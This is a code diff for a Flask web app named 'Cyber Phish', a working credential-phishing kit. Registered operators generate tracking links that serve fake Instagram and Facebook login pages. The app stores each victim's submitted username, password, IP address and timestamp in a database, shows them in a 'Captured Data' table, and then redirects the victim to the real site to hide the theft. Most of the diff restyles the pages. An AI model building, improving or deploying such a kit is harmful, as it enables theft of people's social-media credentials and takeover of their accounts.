@@ -5,11 +5,11 @@ from datetime import datetime
 from flask import Flask, request, render_template_string, redirect, url_for, session
 
 app = Flask(__name__)
-app.secret_key = 'your-super-secret-key-change-this'
+app.secret_key = 'your-secret-key-change-this'
 
 DB_NAME = 'phish_data.db'
 
-# ----------------- ডাটাবেস -----------------
+# -----------------  -----------------
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
@@ -40,135 +40,302 @@ def init_db():
 
 init_db()
 
-# ----------------- HTML টেমপ্লেট (সরাসরি স্ট্রিং - কোনো templates ফোল্ডার লাগবে না) -----------------
-REGISTER_HTML = '''
-<!DOCTYPE html>
-<html>
-<head><title>Register</title></head>
-<body>
-<h2>Register</h2>
-<form method="post">
-    <input name="username" placeholder="Username" required><br>
-    <input type="password" name="password" placeholder="Password" required><br>
-    <button type="submit">Register</button>
-</form>
-<a href="/login">Login</a>
-</body>
-</html>
+# -----------------  HTML  -----------------
+BASE_STYLE = '''
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
+        font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif;
+        min-height: 100vh;
+        color: #e0e0e0;
+    }
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 30px 20px;
+    }
+    .glass-card {
+        background: rgba(20, 28, 40, 0.7);
+        backdrop-filter: blur(12px);
+        border-radius: 32px;
+        border: 1px solid rgba(0, 255, 255, 0.2);
+        box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
+        padding: 30px;
+        transition: 0.3s;
+    }
+    h1, h2, h3 {
+        background: linear-gradient(135deg, #00ffff, #ff00ff);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        margin-bottom: 15px;
+    }
+    .brand {
+        font-size: 1.8rem;
+        font-weight: 800;
+        letter-spacing: 2px;
+        text-align: center;
+        margin-bottom: 20px;
+        text-shadow: 0 0 10px cyan;
+    }
+    input, select, button {
+        width: 100%;
+        padding: 12px 16px;
+        margin: 8px 0;
+        border-radius: 40px;
+        border: none;
+        background: rgba(10, 15, 30, 0.8);
+        color: white;
+        font-size: 1rem;
+        outline: none;
+        transition: 0.2s;
+    }
+    input:focus, select:focus {
+        border: 1px solid cyan;
+        box-shadow: 0 0 8px cyan;
+    }
+    button {
+        background: linear-gradient(95deg, #00aaff, #0066cc);
+        cursor: pointer;
+        font-weight: bold;
+    }
+    button:hover {
+        transform: scale(0.98);
+        background: linear-gradient(95deg, #00ccff, #0077ee);
+    }
+    a {
+        color: #00ffff;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+    .link-card {
+        background: rgba(0, 0, 0, 0.4);
+        border-radius: 24px;
+        padding: 15px;
+        margin-bottom: 15px;
+        border-left: 4px solid cyan;
+    }
+    .badge {
+        background: #ff00ff;
+        padding: 4px 12px;
+        border-radius: 30px;
+        font-size: 0.7rem;
+        display: inline-block;
+        margin-right: 10px;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        background: rgba(0,0,0,0.3);
+        border-radius: 20px;
+        overflow: hidden;
+    }
+    th, td {
+        padding: 12px;
+        text-align: left;
+        border-bottom: 1px solid #2a3246;
+    }
+    th {
+        background: #1e2a3a;
+    }
+    .btn-small {
+        display: inline-block;
+        background: #2c3e50;
+        padding: 6px 15px;
+        border-radius: 30px;
+        font-size: 0.8rem;
+        margin-top: 8px;
+    }
+    .flex-between {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .logout {
+        text-align: right;
+        margin-bottom: 15px;
+    }
+</style>
 '''
 
-LOGIN_HTML = '''
+REGISTER_HTML = f'''
 <!DOCTYPE html>
 <html>
-<head><title>Login</title></head>
+<head><title>Cyber Phish - Register</title>{BASE_STYLE}</head>
 <body>
-<h2>Login</h2>
-<form method="post">
-    <input name="username" placeholder="Username" required><br>
-    <input type="password" name="password" placeholder="Password" required><br>
-    <button type="submit">Login</button>
-</form>
-<a href="/register">Register</a>
-</body>
-</html>
-'''
-
-DASHBOARD_HTML = '''
-<!DOCTYPE html>
-<html>
-<head><title>Dashboard</title></head>
-<body>
-<h2>Dashboard - Welcome {{ user }}</h2>
-<a href="/create_link">➕ Create New Phishing Link</a>
-<h3>Your Links</h3>
-<ul>
-    {% for link in links %}
-    <li>
-        🔗 <code>{{ request.host_url }}f/{{ link.link_id }}</code> ({{ link.template }}) 
-        - <a href="/victims/{{ link.link_id }}">👁️ View Victims</a>
-    </li>
-    {% endfor %}
-</ul>
-<a href="/logout">Logout</a>
-</body>
-</html>
-'''
-
-CREATE_LINK_HTML = '''
-<!DOCTYPE html>
-<html>
-<head><title>Create Link</title></head>
-<body>
-<h2>Generate New Phishing Link</h2>
-<form method="post">
-    <select name="template">
-        <option value="instagram">Instagram</option>
-        <option value="facebook">Facebook</option>
-    </select>
-    <button type="submit">Generate</button>
-</form>
-<a href="/dashboard">Back</a>
-</body>
-</html>
-'''
-
-INSTAGRAM_PAGE = '''
-<!DOCTYPE html>
-<html>
-<head><title>Instagram Login</title></head>
-<body style="background:#fafafa; font-family:sans-serif;">
-<div style="width:350px; margin:100px auto; background:white; padding:40px; border-radius:10px;">
-    <h2>Instagram</h2>
-    <form method="post">
-        <input type="text" name="username" placeholder="Username or Email" style="width:100%; padding:10px; margin:10px 0;" required><br>
-        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required><br>
-        <button type="submit" style="background:#0095f6; color:white; border:none; padding:10px; width:100%;">Log In</button>
-    </form>
+<div class="container">
+    <div class="glass-card" style="max-width: 450px; margin: auto;">
+        <div class="brand"> CYBER PHISH</div>
+        <h2>Register</h2>
+        <form method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Register</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="/login">Already have an account? Login</a>
+        </div>
+    </div>
 </div>
 </body>
 </html>
 '''
 
-FACEBOOK_PAGE = '''
+LOGIN_HTML = f'''
 <!DOCTYPE html>
 <html>
-<head><title>Facebook Login</title></head>
-<body style="background:#e9ebee; font-family:sans-serif;">
-<div style="width:400px; margin:150px auto; background:white; padding:30px; border-radius:8px;">
-    <h2>Facebook</h2>
-    <form method="post">
-        <input type="text" name="username" placeholder="Email or Phone" style="width:100%; padding:10px; margin:10px 0;" required><br>
-        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required><br>
-        <button type="submit" style="background:#1877f2; color:white; border:none; padding:10px; width:100%;">Log In</button>
-    </form>
+<head><title>Cyber Phish - Login</title>{BASE_STYLE}</head>
+<body>
+<div class="container">
+    <div class="glass-card" style="max-width: 450px; margin: auto;">
+        <div class="brand"> CYBER PHISH</div>
+        <h2>Login</h2>
+        <form method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="/register">Create new account</a>
+        </div>
+    </div>
 </div>
 </body>
 </html>
 '''
 
-VICTIMS_HTML = '''
+DASHBOARD_HTML = f'''
 <!DOCTYPE html>
 <html>
-<head><title>Victims - {{ link_id }}</title></head>
+<head><title>Cyber Phish - Dashboard</title>{BASE_STYLE}</head>
 <body>
-<h2>Captured Credentials for Link: {{ link_id }}</h2>
-<table border="1" cellpadding="5">
-    <tr><th>Username/Email</th><th>Password</th><th>IP Address</th><th>Date/Time</th></tr>
-    {% for v in victims %}
-    <tr>
-        <td>{{ v.username }}</td>
-        <td>{{ v.password }}</td>
-        <td>{{ v.ip }}</td>
-        <td>{{ v.submitted_at }}</td>
-    </tr>
-    {% endfor %}
-</table>
-<a href="/dashboard">⬅ Back to Dashboard</a>
+<div class="container">
+    <div class="logout"><a href="/logout"> Logout</a></div>
+    <div class="glass-card">
+        <div class="brand"> CYBER PHISH</div>
+        <div class="flex-between">
+            <h2>Dashboard, {{ user }}</h2>
+            <a href="/create_link" class="btn-small"> New Link</a>
+        </div>
+        <h3>Your Phishing Links</h3>
+        {% for link in links %}
+        <div class="link-card">
+            <span class="badge">{{ link.template.upper() }}</span>
+            <code style="word-break: break-all;">{{ request.host_url }}f/{{ link.link_id }}</code>
+            <div class="flex-between" style="margin-top: 10px;">
+                <small>Created: {{ link.created_at }}</small>
+                <a href="/victims/{{ link.link_id }}"> View Victims</a>
+            </div>
+        </div>
+        {% else %}
+        <p>No links yet. Click "New Link" to start.</p>
+        {% endfor %}
+    </div>
+</div>
 </body>
 </html>
 '''
 
-# ----------------- রাউট -----------------
+CREATE_LINK_HTML = f'''
+<!DOCTYPE html>
+<html>
+<head><title>Cyber Phish - Create Link</title>{BASE_STYLE}</head>
+<body>
+<div class="container">
+    <div class="glass-card" style="max-width: 500px; margin: auto;">
+        <div class="brand"> CYBER PHISH</div>
+        <h2>Generate New Link</h2>
+        <form method="post">
+            <select name="template" required>
+                <option value="instagram">Instagram</option>
+                <option value="facebook">Facebook</option>
+            </select>
+            <button type="submit">Generate</button>
+        </form>
+        <div style="text-align: center; margin-top: 20px;">
+            <a href="/dashboard"> Back</a>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+'''
+
+INSTAGRAM_PAGE = f'''
+<!DOCTYPE html>
+<html>
+<head><title>Cyber Phish - Instagram</title>{BASE_STYLE}</head>
+<body>
+<div class="container">
+    <div class="glass-card" style="max-width: 450px; margin: auto;">
+        <div class="brand"> CYBER PHISH</div>
+        <h2 style="text-align:center;">Instagram Login</h2>
+        <form method="post">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
+'''
+
+FACEBOOK_PAGE = f'''
+<!DOCTYPE html>
+<html>
+<head><title>Cyber Phish - Facebook</title>{BASE_STYLE}</head>
+<body>
+<div class="container">
+    <div class="glass-card" style="max-width: 450px; margin: auto;">
+        <div class="brand"> CYBER PHISH</div>
+        <h2 style="text-align:center;">Facebook Login</h2>
+        <form method="post">
+            <input type="text" name="username" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
+'''
+
+VICTIMS_HTML = f'''
+<!DOCTYPE html>
+<html>
+<head><title>Cyber Phish - Victims</title>{BASE_STYLE}</head>
+<body>
+<div class="container">
+    <div class="glass-card">
+        <div class="brand"> CYBER PHISH</div>
+        <div class="flex-between">
+            <h2>Captured Data</h2>
+            <a href="/dashboard" class="btn-small"> Back</a>
+        </div>
+        <p><strong>Link ID:</strong> <code>{{ link_id }}</code></p>
+        <div style="overflow-x: auto;">
+        <table>
+            <thead><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>Time</th></tr></thead>
+            <tbody>
+                {% for v in victims %}
+                <tr><td>{{ v.username }}</td><td>{{ v.password }}</td><td>{{ v.ip }}</td><td>{{ v.submitted_at }}</td></tr>
+                {% else %}
+                <tr><td colspan="4" style="text-align:center;">No victims yet. Share your link first.</td></tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+'''
+
+# -----------------  -----------------
 @app.route('/')
 def home():
     if 'user_id' in session:
@@ -260,9 +427,8 @@ def phish_page(link_id):
                   (link_id, username, password, ip, datetime.now()))
         conn.commit()
         conn.close()
-        # Redirect to real site
         real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
-        return f"<h2>Redirecting...</h2><script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script>"
+        return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
     conn.close()
     if template_name == 'instagram':
         return render_template_string(INSTAGRAM_PAGE)
